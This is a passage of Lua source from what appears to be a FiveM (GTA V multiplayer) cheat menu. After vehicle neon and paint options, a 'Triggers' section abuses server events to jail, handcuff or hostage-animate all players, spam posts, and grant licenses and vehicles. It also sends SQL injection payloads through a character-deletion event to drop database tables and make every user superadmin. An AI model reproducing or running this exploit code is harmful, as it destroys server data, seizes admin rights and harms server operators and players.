                    Get = function(veh) return rainbow_neon == veh and "~g~ON" or "~r~OFF" end,
   
                    Set = function(veh)
   
                        if rainbow_neon then
   
                            rainbow_neon = nil
   
    
   
                            return
   
                        else
   
                            rainbow_neon = veh
   
                        end
   
    
   
                        CreateThread(function()
   
                            while rainbow_neon and AREF.Enabled do
   
                                local r, g, b = AREF:GetRainbow(1)
   
                                AREF:GetFunction("SetVehicleNeonLightsColour")(rainbow_neon, r, g, b)
   
                                Wait(0)
   
                            end
   
                        end)
   
                    end
   
                },
   
                {
   
                    Name = "Neon Color",
   
                    Get = function(veh)
   
                        local r, g, b = AREF:GetFunction("GetVehicleNeonLightsColour")(veh)
   
    
   
                        if not r then
   
                            r = 255
   
                        end
   
    
   
                        if not g then
   
                            g = 255
   
                        end
   
    
   
                        if not b then
   
                            b = 255
   
                        end
   
    
   
                        return dict.tostring(r) .. " " .. dict.tostring(g) .. " " .. dict.tostring(b)
   
                    end,
   
                    Set = function(veh)
   
                        local r, g, b = AREF:GetFunction("GetVehicleNeonLightsColour")(veh)
   
    
   
                        if not r then
   
                            r = 255
   
                        end
   
    
   
                        if not g then
   
                            g = 255
   
                        end
   
    
   
                        if not b then
   
                            b = 255
   
                        end
   
    
   
                        local r = AREF:GetTextInput("Enter red value.", r, 3)
   
    
   
                        if not r or r == "" or not tonumber(r) then
   
                            AREF:AddNotification("ERROR", "Invalid red value.", 5000)
   
                        else
   
                            local g = AREF:GetTextInput("Enter green value.", g, 3)
   
    
   
                            if not g or g == "" or not tonumber(g) then
   
                                AREF:AddNotification("ERROR", "Invalid green value.", 5000)
   
                            else
   
                                local b = AREF:GetTextInput("Enter blue value.", b, 3)
   
    
   
                                if not b or b == "" or not tonumber(b) then
   
                                    AREF:AddNotification("ERROR", "Invalid blue value.", 5000)
   
                                else
   
                                    r = AREF:Clamp(tonumber(r), 0, 255)
   
                                    g = AREF:Clamp(tonumber(g), 0, 255)
   
                                    b = AREF:Clamp(tonumber(b), 0, 255)
   
                                    AREF:GetFunction("SetVehicleNeonLightsColour")(veh, r, g, b)
   
                                end
   
                            end
   
                        end
   
                    end
   
                },
   
                {
   
                    Name = "Neon Lights",
   
                    Get = function(veh) return "" end,
   
                    Set = function(veh)
   
                        for i = 0, 4 do
   
                            SetVehicleNeonLightEnabled(veh, i, true)
   
                        end
   
                    end
   
                },
   
                {
   
                    Name = "Xenon Lights",
   
                    Get = function(veh) return "" end,
   
                    Set = function(veh)
   
                        ToggleVehicleMod(veh, 22, true)
   
                    end
   
                }
   
            }
   
        }
   
    
   
        local LSC_List = {"Paint", "Lights"}
   
        local current_lsc_menu
   
        local current_lsc_opt = 1
   
        local old_lsc_opt
   
    
   
        function AREF:DoLSC(bOn)
   
            if bOn ~= nil then
   
                self.UseLSC = bOn
   
                current_lsc_menu = nil
   
                current_lsc_opt = 1
   
            end
   
    
   
            if not self.UseLSC then return end
   
            local curVeh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
            if not self:GetFunction("DoesEntityExist")(curVeh) or self:GetFunction("GetPedInVehicleSeat")(curVeh, -1) ~= self.LocalPlayer then
   
                self.UseLSC = false
   
    
   
                return self:AddNotification("ERROR", "You must be in a vehicle to use this!", 5000)
   
            end
   
    
   
            if bOn ~= nil then
   
                self.Showing = not bOn
   
            end
   
    
   
            self.Painter:DrawText("[" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name) .. "] Los Santos Customs", 4, false, 101, 101, 0.35, 255, 255, 255, 255)
   
            local sY = 30
   
    
   
            if not current_lsc_menu then
   
                for id, name in dict.pairs(LSC_List) do
   
                    local r, g, b = 255, 255, 255
   
    
   
                    if current_lsc_opt == id then
   
                        r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]
   
                    end
   
    
   
                    self.Painter:DrawText(name, 4, false, 101, 101 + sY, 0.35, r, g, b, 255)
   
                    sY = sY + 20
   
                end
   
            else
   
                for id, dat in dict.pairs(LSC_Menu[current_lsc_menu]) do
   
                    local r, g, b = 255, 255, 255
   
    
   
                    if current_lsc_opt == id then
   
                        r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]
   
                    end
   
    
   
                    self.Painter:DrawText(dat.Name .. " " .. dat.Get(curVeh), 4, false, 101, 101 + sY, 0.35, r, g, b, 255)
   
                    sY = sY + 20
   
                end
   
            end
   
    
   
            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["DOWN"]) and not self.Showing then
   
                current_lsc_opt = current_lsc_opt + 1
   
    
   
                if current_lsc_menu then
   
                    if current_lsc_opt < 1 then
   
                        current_lsc_opt = #LSC_Menu[current_lsc_menu]
   
                    elseif not LSC_Menu[current_lsc_menu][current_lsc_opt] then
   
                        current_lsc_opt = 1
   
                    end
   
                else
   
                    if current_lsc_opt < 1 then
   
                        current_lsc_opt = #LSC_List
   
                    elseif not LSC_List[current_lsc_opt] then
   
                        current_lsc_opt = 1
   
                    end
   
                end
   
            end
   
    
   
            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["UP"]) and not self.Showing then
   
                current_lsc_opt = current_lsc_opt - 1
   
    
   
                if current_lsc_menu then
   
                    if current_lsc_opt < 1 then
   
                        current_lsc_opt = #LSC_Menu[current_lsc_menu]
   
                    elseif not LSC_Menu[current_lsc_menu][current_lsc_opt] then
   
                        current_lsc_opt = 1
   
                    end
   
                else
   
                    if current_lsc_opt < 1 then
   
                        current_lsc_opt = #LSC_List
   
                    elseif not LSC_List[current_lsc_opt] then
   
                        current_lsc_opt = 1
   
                    end
   
                end
   
            end
   
    
   
            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["BACKSPACE"]) and not self.Showing then
   
                if not current_lsc_menu then
   
                    self.UseLSC = false
   
                    current_lsc_opt = 1
   
                    old_lsc_opt = 1
   
                else
   
                    current_lsc_menu = nil
   
                    current_lsc_opt = old_lsc_opt
   
                    old_lsc_opt = nil
   
                end
   
            end
   
    
   
            if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["ENTER"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["MOUSE1"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["SPACE"]) and not self.Showing then
   
                if not current_lsc_menu then
   
                    current_lsc_menu = LSC_List[current_lsc_opt]
   
                    old_lsc_opt = current_lsc_opt
   
                    current_lsc_opt = 1
   
                else
   
                    local opt = LSC_Menu[current_lsc_menu][current_lsc_opt]
   
    
   
                    if opt then
   
                        opt.Set(curVeh)
   
                    end
   
                end
   
            end
   
    
   
            self.Painter:DrawRect(101, 100, 360, sY + 8, 0, 0, 0, 200)
   
            self.Painter:DrawRect(101, 130, 360, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 255)
   
        end
   
    
   
        AREF:AddCategory("Triggers", function(self, x, y, w, h)
   
            local curY = 5
   
            if _count(self.DynamicTriggers) <= 0 then return self.Painter:DrawText("No triggers could be found.", 4, false, x + 5, y + 5, 0.4, 255, 255, 255, 255) end
   
    
   
            if self.DynamicTriggers["esx-qalle-jail"] and self.DynamicTriggers["esx-qalle-jail"]["esx-qalle-jail:jailPlayer"] then
   
                if self.Painter:Button("JAIL ~g~ESX ~s~(ALT FOR ALL) (SHIFT FOR REASON)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "jail") then
   
                    CreateThread(function()
   
                        local reason = "^3#FalloutMenu"
   
    
   
                        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then
   
                            local _msg = self:GetTextInput("Enter jail reason.", reason, 200)
   
    
   
                            if _msg then
   
                                reason = _msg
   
                            end
   
                        end
   
    
   
                        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTALT"]) then
   
                            for id, src in dict.pairs(self.PlayerCache) do
   
                                src = dict.tonumber(src)
   
                                local _id = dict.tonumber(self:GetFunction("GetPlayerServerId")(src))
   
                                self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx-qalle-jail"]["esx-qalle-jail:jailPlayer"], _id, dict.math.random(500, 5000), reason)
   
                            end
   
    
   
                            self:AddNotification("INFO", "All players jailed!", 10000)
   
                        else
   
                            local who = self:GetTextInput("Enter player id.", "", 5)
   
    
   
                            if who then
   
                                _id = dict.tonumber(who)
   
    
   
                                if not _id then
   
                                    self:AddNotification("ERROR", "Invalid player id.", 5000)
   
                                else
   
                                    self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx-qalle-jail"]["esx-qalle-jail:jailPlayer"], _id, dict.math.random(500, 5000), reason)
   
                                    self:AddNotification("INFO", "Jailed " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, _id) .. "!", 10000)
   
                                end
   
                            end
   
                        end
   
                    end)
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.DynamicTriggers["esx_policejob"] and self.DynamicTriggers["esx_policejob"]["esx_policejob:handcuff"] then
   
                if self.Painter:Button("HANDCUFF ~g~ESX ~s~(ALT FOR ALL)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "handcuff_all") then
   
                    CreateThread(function()
   
                        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTALT"]) then
   
                            for id, src in dict.pairs(self.PlayerCache) do
   
                                src = dict.tonumber(src)
   
                                local _id = dict.tonumber(self:GetFunction("GetPlayerServerId")(src))
   
                                self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_policejob"]["esx_policejob:handcuff"], _id)
   
                            end
   
    
   
                            self:AddNotification("INFO", "All players cuffed!", 10000)
   
                        else
   
                            local who = self:GetTextInput("Enter player id.", "", 5)
   
    
   
                            if who then
   
                                local _id = dict.tonumber(who)
   
    
   
                                if not _id then
   
                                    self:AddNotification("ERROR", "Invalid player id.", 5000)
   
                                else
   
                                    self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_policejob"]["esx_policejob:handcuff"], _id)
   
                                    self:AddNotification("INFO", "Cuffed " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, _id) .. "!", 10000)
   
                                end
   
                            end
   
                        end
   
                    end)
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.DynamicTriggers["CarryPeople"] and self.DynamicTriggers["CarryPeople"]["CarryPeople:sync"] then
   
                if self.Painter:Button("CARRY ALL", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "carry_all") then
   
                    if self.Config.SafeMode then
   
                        return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                    else
   
                        CreateThread(function()
   
                            for id, src in dict.pairs(self.PlayerCache) do
   
                                src = dict.tonumber(src)
   
    
   
                                if src ~= self.NetworkID then
   
                                    local ped = self:GetFunction("GetPlayerPed")(src)
   
    
   
                                    if self:GetFunction("DoesEntityExist")(ped) then
   
                                        self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["CarryPeople"]["CarryPeople:sync"], ped, "missfinale_c2mcs_1", "nm", "fin_c2_mcs_1_camman", "firemans_carry", 0.15, 0.27, 0.63, self:GetFunction("GetPlayerServerId")(src), 100000, 0.0, 49, 33, 1)
   
                                        Wait(100)
   
                                    end
   
                                end
   
                            end
   
                        end)
   
    
   
                        self:AddNotification("INFO", "Carrying all players!", 10000)
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.DynamicTriggers["TakeHostage"] and self.DynamicTriggers["TakeHostage"]["cmg3_animations:sync"] then
   
                if self.Painter:Button("TAKE HOSTAGE ALL", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "th_all") then
   
                    if self.Config.SafeMode then
   
                        return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                    else
   
                        CreateThread(function()
   
                            for id, src in dict.pairs(self.PlayerCache) do
   
                                src = dict.tonumber(src)
   
    
   
                                if src ~= self.NetworkID then
   
                                    local ped = self:GetFunction("GetPlayerPed")(src)
   
    
   
                                    if self:GetFunction("DoesEntityExist")(ped) then
   
                                        self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["TakeHostage"]["cmg3_animations:sync"], ped, "anim@gangops@hostage@", "anim@gangops@hostage@", "perp_idle", "victim_idle", 0.11, 0.24, 0.0, self:GetFunction("GetPlayerServerId")(src), 100000, 0.0, 49, 49, 50, true)
   
                                        Wait(100)
   
                                    end
   
                                end
   
                            end
   
                        end)
   
    
   
                        self:AddNotification("INFO", "Taken all players!", 10000)
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.DynamicTriggers["PiggyBack"] and self.DynamicTriggers["PiggyBack"]["cmg2_animations:sync"] then
   
                if self.Painter:Button("PIGGY BACK ALL", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "pb_all") then
   
                    if self.Config.SafeMode then
   
                        return self:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
   
                    else
   
                        CreateThread(function()
   
                            for id, src in dict.pairs(self.PlayerCache) do
   
                                src = dict.tonumber(src)
   
    
   
                                if src ~= self.NetworkID then
   
                                    local ped = self:GetFunction("GetPlayerPed")(src)
   
    
   
                                    if self:GetFunction("DoesEntityExist")(ped) then
   
                                        self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["PiggyBack"]["cmg2_animations:sync"], ped, "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_a", "piggyback_c_player_b", -0.07, 0.0, 0.0, self:GetFunction("GetPlayerServerId")(src), 100000, 0.0, 49, 33, 1, 1)
   
                                        Wait(100)
   
                                    end
   
                                end
   
                            end
   
                        end)
   
    
   
                        self:AddNotification("INFO", "Taken all players!", 10000)
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.DynamicTriggers["esx_policejob"] and self.DynamicTriggers["esx_policejob"]["esx_communityservice:sendToCommunityService"] then
   
                if self.Painter:Button("COMMUNITY SERVICE ALL ~g~ESX ~s~(ALT FOR ALL) (SHIFT FOR TIME)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "service_all") then
   
                    CreateThread(function()
   
                        local time = math.random(500, 5000)
   
    
   
                        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then
   
                            local _msg = self:GetTextInput("Enter service time.", time, 10)
   
    
   
                            if _msg then
   
                                time = dict.tonumber(_msg) or time
   
                            end
   
                        end
   
    
   
                        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTALT"]) then
   
                            for id, src in dict.pairs(self.PlayerCache) do
   
                                src = dict.tonumber(src)
   
                                local _id = dict.tonumber(self:GetFunction("GetPlayerServerId")(src))
   
                                self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_policejob"]["esx_communityservice:sendToCommunityService"], _id, time)
   
                            end
   
    
   
                            self:AddNotification("INFO", "All players sent to community service!", 10000)
   
                        else
   
                            local who = self:GetTextInput("Enter player id.", "", 5)
   
    
   
                            if who then
   
                                local _id = dict.tonumber(who)
   
    
   
                                if not _id then
   
                                    self:AddNotification("ERROR", "Invalid player id.", 5000)
   
                                else
   
                                    self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_policejob"]["esx_communityservice:sendToCommunityService"], _id, time)
   
                                    self:AddNotification("INFO", "Gave community service to " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, _id) .. "!", 10000)
   
                                end
   
                            end
   
                        end
   
                    end)
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.DynamicTriggers["esx_inventoryhud"] and self.DynamicTriggers["esx_inventoryhud"]["esx_inventoryhud:openPlayerInventory"] then
   
                if self.Painter:Button("OPEN INVENTORY ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "open_inventory") then
   
                    local who = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)
   
    
   
                    if not self:GetFunction("DoesEntityExist")(who) then
   
                        self:AddNotification("ERROR", "You must select a player to open their inventory!", 10000)
   
                    else
   
                        TriggerEvent(self.DynamicTriggers["esx_inventoryhud"]["esx_inventoryhud:openPlayerInventory"], self:GetFunction("GetPlayerServerId")(self.SelectedPlayer), self:GetFunction("GetPlayerName")(self.SelectedPlayer))
   
                        self.Showing = false
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if (self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]) then
   
                if self.Painter:Button("DELETE DATABASE ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "delete_database") then
   
                    local possible_tables = {"twitter_accounts", "twitter_likes", "twitter_tweets", "phone_app_chat", "users", "user_accounts", "user_inventory", "society_moneywash", "phone_users_contacts", "characters", "billing", "vehicles", "weashops", "vehicle_categories", "rented_vehicles", "addon_account_data", "addon_inventory_items", "datastore_data", "owned_vehicles", "phone_calls", "phone_messages", "rented_vehicles", "user_licenses", "mysql"}
   
    
   
                    CreateThread(function()
   
                        for _, str in dict.ipairs(possible_tables) do
   
                            local injection = [['; DROP TABLE `]] .. str .. [[` #]]
   
                            self:GetFunction("TriggerServerEvent")((self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]), injection)
   
                            self:AddNotification("SUCCESS", "Deleted table " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, str) .. "!", 5000)
   
                            Wait(10)
   
                        end
   
    
   
                        self:AddNotification("SUCCESS", "Database deleted!", 5000)
   
                    end)
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.DynamicTriggers["esx_dmvschool"] and self.DynamicTriggers["esx_dmvschool"]["esx_dmvschool:addLicense"] then
   
                if self.Painter:Button("ALL DMV LICENSES ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "dmv_all_licenses") then
   
                    local possible_licenses = {"dmv", "drive", "drive_truck", "drive_bike"}
   
    
   
                    CreateThread(function()
   
                        for _, str in dict.ipairs(possible_licenses) do
   
                            self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_dmvschool"]["esx_dmvschool:addLicense"], str)
   
                            self:AddNotification("SUCCESS", "Gave license " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, str) .. "!", 5000)
   
                            Wait(10)
   
                        end
   
    
   
                        self:AddNotification("SUCCESS", "All licenses given!", 5000)
   
                    end)
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.DynamicTriggers["gcphone"] and self.DynamicTriggers["gcphone"]["gcPhone:twitter_postTweets"] then
   
                if self.Painter:Button("SPAM TWEET ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "spam_tweet") then
   
                    local user, pass = "", ""
   
                    local _msg = self:GetTextInput("Enter twitter username.", time, 50)
   
    
   
                    if _msg then
   
                        user = _msg
   
                    end
   
    
   
                    _msg = self:GetTextInput("Enter twitter password.", time, 50)
   
    
   
                    if _msg then
   
                        pass = _msg
   
                    end
   
    
   
                    if user == "" or pass == "" then
   
                        self:AddNotification("INFO", "Cancelled.", 5000)
   
                    else
   
                        _msg = self:GetTextInput("Enter tweet message.", "", 5000)
   
    
   
                        if not _msg or _msg == "" then
   
                            self:AddNotification("INFO", "Cancelled.", 5000)
   
                        else
   
                            local times = self:GetTextInput("Enter amount of times to tweet.", "1", 5000)
   
    
   
                            if not times or not dict.tonumber(times) then
   
                                times = 1
   
                            else
   
                                times = dict.tonumber(times)
   
                            end
   
    
   
                            if times <= 0 then
   
                                times = 1
   
                            end
   
    
   
                            self:AddNotification("INFO", "Sending tweet " .. times .. " time" .. (times ~= 1 and "s" or ""), 10000)
   
    
   
                            CreateThread(function()
   
                                for i = 1, times do
   
                                    if not self.Enabled then return end
   
                                    self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["gcphone"]["gcPhone:twitter_postTweets"], user, pass, _msg)
   
                                    Wait(100)
   
                                end
   
                            end)
   
                        end
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if (self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]) then
   
                if self.Painter:Button("SET SUPERADMIN ~g~ESX ~s~(ALT FOR ALL) (SHIFT FOR SPECIFIC)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_superadmin") then
   
                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTALT"]) then
   
                        CreateThread(function()
   
                            local injection = [['; UPDATE `users` SET `group` = "superadmin", `permission_level` = 10 #]]
   
                            self:GetFunction("TriggerServerEvent")((self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]), injection)
   
                            Wait(10)
   
                            self:AddNotification("SUCCESS", "All players should now have superadmin! You may have to rejoin.", 5000)
   
                        end)
   
                    else
   
                        local name = ""
   
    
   
                        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then
   
                            name = self:GetTextInput("Enter target's steam name.", "", 50)
   
                        else
   
                            name = self:GetFunction("GetPlayerName")(self.NetworkID)
   
                        end
   
    
   
                        if not name or name == "" then
   
                            self:AddNotification("INFO", "Cancelled.", 5000)
   
                        else
   
                            CreateThread(function()
   
                                name = name:gsub("\"", "\\\"")
   
                                local injection = [['; UPDATE `users` SET `group` = "superadmin", `permission_level` = 10 WHERE `name` = "]] .. name .. [[" #]]
   
                                self:GetFunction("TriggerServerEvent")((self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]), injection)
   
                                Wait(10)
   
                                self:AddNotification("SUCCESS", "Player " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, name) .. " should now have superadmin! You may have to rejoin.", 5000)
   
                            end)
   
                        end
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if (self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]) then
   
                if self.Painter:Button("SET USER ~g~ESX ~s~(ALT FOR ALL) (SHIFT FOR SPECIFIC)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_user") then
   
                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTALT"]) then
   
                        CreateThread(function()
   
                            local injection = [['; UPDATE `users` SET `group` = "user", `permission_level` = 10 #]]
   
                            self:GetFunction("TriggerServerEvent")((self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]), injection)
   
                            Wait(10)
   
                            self:AddNotification("SUCCESS", "All players should now be user! You may have to rejoin.", 5000)
   
                        end)
   
                    else
   
                        local name = ""
   
    
   
                        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then
   
                            name = self:GetTextInput("Enter target's steam name.", "", 50)
   
                        else
   
                            name = self:GetFunction("GetPlayerName")(self.NetworkID)
   
                        end
   
    
   
                        if not name or name == "" then
   
                            self:AddNotification("INFO", "Cancelled.", 5000)
   
                        else
   
                            CreateThread(function()
   
                                local injection = [['; UPDATE `users` SET `group` = "user", `permission_level` = 10 WHERE `name` = "]] .. name .. [[" #]]
   
                                self:GetFunction("TriggerServerEvent")((self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]), injection)
   
                                Wait(10)
   
                                self:AddNotification("SUCCESS", "Player " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, name) .. " should now be user! You may have to rejoin.", 5000)
   
                            end)
   
                        end
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if (self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]) then
   
                if self.Painter:Button("SET CHARACTER NAME ~g~ESX ~s~(ALT FOR ALL) (SHIFT FOR SPECIFIC)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_character_name") then
   
                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTALT"]) then
   
                        local name = self:GetTextInput("Enter full name. [Seperated by space]", "", 50)
   
    
   
                        if not name or not name:find(" ") then
   
                            self:AddNotification("ERROR", "Invalid name.", 5000)
   
                        else
   
                            local sps, spe = name:find(" ")
   
                            local first_name, last_name = name:sub(1, sps - 1), name:sub(spe + 1)
   
    
   
                            CreateThread(function()
   
                                local injection = [['; UPDATE `users` SET `first_name` = "]] .. first_name .. [[", `last_name` = "]] .. last_name .. [[" #]]
   
                                self:GetFunction("TriggerServerEvent")((self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]), injection)
   
                                Wait(10)
   
                                self:AddNotification("SUCCESS", "Name set! You may have to rejoin.", 5000)
   
                            end)
   
                        end
   
                    else
   
                        local name = ""
   
    
   
                        if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then
   
                            name = self:GetTextInput("Enter target's steam name.", "", 50)
   
                        else
   
                            name = self:GetFunction("GetPlayerName")(self.NetworkID)
   
                        end
   
    
   
                        if not name or name == "" then
   
                            self:AddNotification("INFO", "Cancelled.", 5000)
   
                        else
   
                            local cname = self:GetTextInput("Enter new full name. [Seperated by space]", "", 50)
   
    
   
                            if not cname or not cname:find(" ") then
   
                                self:AddNotification("ERROR", "Invalid name.", 5000)
   
                            else
   
                                local sps, spe = cname:find(" ")
   
                                local first_name, last_name = cname:sub(1, sps - 1), cname:sub(spe + 1)
   
    
   
                                CreateThread(function()
   
                                    local injection = [['; UPDATE `users` SET `first_name` = "]] .. first_name .. [[", `last_name` = "]] .. last_name .. [[" WHERE `name` = "]] .. name .. [[" #]]
   
                                    self:GetFunction("TriggerServerEvent")((self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]), injection)
   
                                    Wait(10)
   
                                    self:AddNotification("SUCCESS", "Player " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, name .. (name:sub(-1) == "s" and "'" or "'s")) .. " name should now be " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, cname) .. "! You may have to rejoin.", 5000)
   
                                end)
   
                            end
   
                        end
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
            end
   
    
   
            if self.DynamicTriggers["esx_vehicleshop"] then
   
                if self.Painter:Button("SET CURRENT VEHICLE AS OWNED ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_current_owned") then
   
                    local curVeh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                    if not self:GetFunction("DoesEntityExist")(curVeh) or self:GetFunction("GetPedInVehicleSeat")(curVeh, -1) ~= self.LocalPlayer then
   
                        self:AddNotification("ERROR", "You must be in a vehicle to use this!", 5000)
   
                    else
   
                        if not self.ESX then
   
                            self:AddNotification("ERROR", "Could not get reference to ESX object.", 5000)
   
                        else
   
                            local props = self.ESX.Game.GetVehicleProperties(curVeh)
   
                            local model = GetDisplayNameFromVehicleModel(props.model)
   
                            self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_vehicleshop"]["esx_vehicleshop:setVehicleOwnedPlayerId"], self:GetFunction("GetPlayerServerId")(self.NetworkID), props, model, model)
   
                            self:AddNotification("SUCCESS", "Owned vehicle.", 5000)
   
                        end
   
                    end
   
                end
   
    
   
                curY = curY + 25
   
    
   
                if self.Painter:Button("GIVE CURRENT VEHICLE TO PLAYER ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "give_current_owned") then
   
                    local curVeh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)
   
    
   
                    if not self:GetFunction("DoesEntityExist")(curVeh) or self:GetFunction("GetPedInVehicleSeat")(curVeh, -1) ~= self.LocalPlayer then
   
                        self:AddNotification("ERROR", "You must be in a vehicle to use this!", 5000)
   
                    else
   
                        if not self.ESX then
   
                            self:AddNotification("ERROR", "Could not get reference to ESX object.", 5000)
   
                        else
   
                            if not self.SelectedPlayer or not self.Util:ValidPlayer(self.SelectedPlayer) then
   
                                self:AddNotification("ERROR", "You must select a player!")
   
                            else
   
                                local props = self.ESX.Game.GetVehicleProperties(curVeh)
   
                                local model = GetDisplayNameFromVehicleModel(props.model)
   
